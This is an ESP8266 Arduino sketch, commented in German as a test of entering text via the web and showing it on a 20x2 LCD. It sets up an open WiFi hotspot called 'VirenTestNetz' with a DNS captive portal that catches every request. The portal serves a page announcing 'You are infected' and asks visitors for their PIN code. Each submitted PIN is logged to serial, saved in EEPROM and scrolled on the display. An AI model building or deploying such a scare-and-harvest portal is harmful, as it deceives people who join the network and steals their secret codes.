/*
 * Versuch, einen Text übers Web einzugeben, abzuspeichern und auf ein LCD-Display auszugeben...
*/

#include <ESP8266WiFi.h>
#include <WiFiClient.h> 
#include <ESP8266WebServer.h>
#include <EEPROM.h>
#include <LiquidCrystal.h>
#include <string.h>
#include <DNSServer.h>

//LiquidCrystal lcd(RS, E, d4, d5, d6, d7);
LiquidCrystal lcd(D0, D1, D2, D3, D4, D5);
int cols = 20;
int rows = 2;

int stringStart, stringStop = 0;
int scrollCursor = cols;

String line1 = "";
String line0 = "";

/* Set these to your desired credentials. */
const char *ssid = "VirenTestNetz";
const byte DNS_PORT = 53;
DNSServer dnsServer;

int MsgLength = 0;
String form = 
  "<p>"
  "<center>"
  "<h1>You are infected</h1>"
  "<form action='msg'><p>Enter your PIN-Code <input type='text' name='msg' size=50 autofocus> <input type='submit' value='Submit'></form>"
  "</center>";

ESP8266WebServer server(80);

void handle_msg() 
{
  server.send(200, "text/html", form);                    // Send same page so they can send another msg

  String msg = server.arg("msg");

  String decodedMsg = msg;
  // Restore special characters that are misformed to %char by the client browser
  decodedMsg.replace("+", " ");
  decodedMsg.replace("%21", "!");
  decodedMsg.replace("%22", "");
  decodedMsg.replace("%23", "#");
  decodedMsg.replace("%24", "$");
  decodedMsg.replace("%25", "%");
  decodedMsg.replace("%26", "&");
  decodedMsg.replace("%27", "'");
  decodedMsg.replace("%28", "(");
  decodedMsg.replace("%29", ")");
  decodedMsg.replace("%2A", "*");
  decodedMsg.replace("%2B", "+");
  decodedMsg.replace("%2C", ",");
  decodedMsg.replace("%2F", "/");
  decodedMsg.replace("%3A", ":");
  decodedMsg.replace("%3B", ";");
  decodedMsg.replace("%3C", "<");
  decodedMsg.replace("%3D", "=");
  decodedMsg.replace("%3E", ">");
  decodedMsg.replace("%3F", "?");
  decodedMsg.replace("%40", "@");

  Serial.println(decodedMsg);                           // print original string to monitor
  Serial.println(' ');                                  // new line in monitor

  while (decodedMsg.length() < (cols * rows)) {
  decodedMsg = decodedMsg + " ";
  }

  Serial.println("writing message to eeprom :");
  Serial.print("\"");
  MsgLength = decodedMsg.length();
  EEPROM.write(0, MsgLength);
  for (int i = 1; i <= MsgLength; ++i)
       {
        EEPROM.write(i, decodedMsg[i - 1]);
        Serial.print(decodedMsg[i - 1]); 
       }
  EEPROM.commit();
  Serial.println("\" written");
  line1 = decodedMsg;

}



void setup() {
    lcd.begin(cols,rows);
      while (line0.length() < cols) {
      line0 = line0 + " ";
    }
    while (line1.length() < (cols * rows)) {
      line1 = line1 + " ";
    }

  EEPROM.begin(512);
	Serial.begin(115200);
  lcd.begin(20, 2);
  delay(100); 
	Serial.println();
  Serial.println("Reading EEPROM");
  String message;
  MsgLength = EEPROM.read(0);
  for (int i = 1; i <= MsgLength; ++i)
    {
      message += char(EEPROM.read(i));
    } 
  Serial.println(message);
  line1 = message;
 
  IPAddress ip(1,1,1,1);
  IPAddress nm(255,255,255,0);  
  WiFi.softAPConfig(ip, ip, nm);
  dnsServer.start(DNS_PORT, "*", ip);

	Serial.print("Configuring access point... ");
  WiFi.softAP(ssid);
	IPAddress myIP = WiFi.softAPIP();
	Serial.print("AP IP address: ");
	Serial.println(myIP);

// Set up the endpoints for HTTP server,  Endpoints can be written as inline functions:
  server.on("/", []()
  {
    server.send(200, "text/html", form);
  });
  server.on("/msg", handle_msg);                          // And as regular external functions:
  server.begin();                                         // Start the server
	Serial.println("HTTP server started");
}

void loop() {
  dnsServer.processNextRequest();
	server.handleClient();
  
  lcd.setCursor(scrollCursor, 0);
  lcd.print(line0.substring(stringStart,stringStop));
  lcd.setCursor(scrollCursor, 1);
  lcd.print(line1.substring(stringStart,stringStop));
  delay(700);
  
  if(stringStart == 0 && scrollCursor > 0){ 
    scrollCursor--;
    stringStop++;
  } else if (scrollCursor == 0) {  // wenn der Cursor den linken Rand erreicht, links einen Char wegschneiden und rechts ankleben
    line0 = line0.substring(1,line0.length()) + line1.substring(0,1);
    line1 = line1.substring(1,line1.length()) + line1.substring(0,1);
  } else {
    stringStart++;
    stringStop++;
  }
}


